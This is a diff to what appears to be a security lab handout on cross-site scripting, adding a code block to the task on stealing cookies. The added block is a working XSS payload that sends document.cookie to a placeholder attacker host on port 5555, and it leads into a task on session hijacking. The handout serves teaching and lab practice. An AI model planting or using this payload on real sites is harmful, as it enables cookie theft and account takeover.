@@ -108,6 +108,11 @@ Task 3: Stealing Cookies from the Victim’s Machine
 In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
 
 We can do this by having the malicious JavaScript insert an *\<*img*\>* tag with its src attribute set to the attacker’s machine. When the JavaScript inserts the img tag, the browser tries to load the image from the URL in the src field; this results in an HTTP GET request sent to the attacker’s machine. The JavaScript given below sends the cookies to the port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port. The server can print out whatever it receives. The TCP server program is in the echoserver directory on the attacker computer. Note that in the output, the = character gets transformed to %3D.
+```
+<script>document.write('<img src=http://attacker_IP_address:5555?c='
++ escape(document.cookie) + ' >');
+</script>
+```
 
 Task 4: Session Hijacking using the Stolen Cookies
 ===============
